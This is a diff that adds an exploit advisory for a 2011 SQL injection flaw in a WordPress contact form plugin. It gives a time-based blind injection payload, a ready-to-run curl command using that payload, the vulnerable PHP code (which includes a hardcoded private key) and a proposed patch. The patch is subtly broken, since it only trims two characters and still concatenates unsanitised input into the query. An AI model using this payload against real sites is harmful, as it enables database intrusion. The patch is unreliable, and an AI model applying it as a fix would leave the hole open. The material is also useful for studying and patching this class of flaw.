@@ -1,0 +1,82 @@
+# Exploit Title: WordPress Contact Form plugin <= 2.7.5 SQL Injection Vulnerability
+# Date: 2011-10-13
+# Author: Skraps (jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
+# Software Link: http://downloads.wordpress.org/plugin/contact-form-wordpress.zip
+# Version: 2.7.5 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/contact-form-wordpress/easy-form.class.php 
+wpcf_easyform_submitted=1&wpcf_easyform_test1=testing&wpcf_easyform_formid=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)
+ 
+e.g.
+curl --data "wpcf_easyform_submitted=1&wpcf_easyform_test1=testing&wpcf_easyform_formid=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)" -H "X-Requested-With:XMLHttpRequest" http://127.0.0.1/wordpress/?p=1
+ 
+---------------
+Vulnerable code
+---------------
+Line 49:
+    public function the_content($content) {
+        global $wpdb;
+        global $table_name;
+        global $settings_table_name;
+
+        $private_key = '6LdKkr8SAAAAAN3d0B3M_EMh1qx4PeHtOre8loCy';
+
+        if ($_POST['wpcf_easyform_submitted'] == 1) {
+
+            $form = $wpdb->get_results("SELECT * FROM $table_name WHERE ID = ".$_POST['wpcf_easyform_formid']);
+
+---------------
+Patch
+---------------
+
+*** ./easy-form.class.php.orig	2011-10-13 19:53:05.674800956 -0400
+--- ./easy-form.class.php	2011-10-13 19:51:21.442799615 -0400
+***************
+*** 54,61 ****
+          $private_key = '6LdKkr8SAAAAAN3d0B3M_EMh1qx4PeHtOre8loCy';
+          
+          if ($_POST['wpcf_easyform_submitted'] == 1) {
+!         
+!             $form = $wpdb->get_results("SELECT * FROM $table_name WHERE ID = ".$_POST['wpcf_easyform_formid']);
+              
+              $continue = true;
+              
+--- 54,63 ----
+          $private_key = '6LdKkr8SAAAAAN3d0B3M_EMh1qx4PeHtOre8loCy';
+          
+          if ($_POST['wpcf_easyform_submitted'] == 1) {
+!        	    $wpcf_easyform_formid=$_POST['wpcf_easyform_formid'];
+!             $wpcf_easyform_formid=substr($wpcf_easyform_formid,2); 
+!             
+! 	$form = $wpdb->get_results("SELECT * FROM $table_name WHERE ID = ".$wpcf_easyform_formid);
+              
+              $continue = true;
+              
+***************
+*** 71,80 ****
+              if ($continue) {
+              
+                  //loop through the fields of this form (read from DB) and build the message here
+!                 $form_fields = $wpdb->get_results("
+          			SELECT *
+          			FROM $settings_table_name
+!         			WHERE form_id = ".$_POST['wpcf_easyform_formid']."
+          			ORDER BY position
+          		");
+          		
+--- 73,82 ----
+              if ($continue) {
+              
+                  //loop through the fields of this form (read from DB) and build the message here
+! 		$form_fields = $wpdb->get_results("
+          			SELECT *
+          			FROM $settings_table_name
+!         			WHERE form_id = ".$wpcf_easyform_formid."
+          			ORDER BY position
+          		");
+          		
+
+
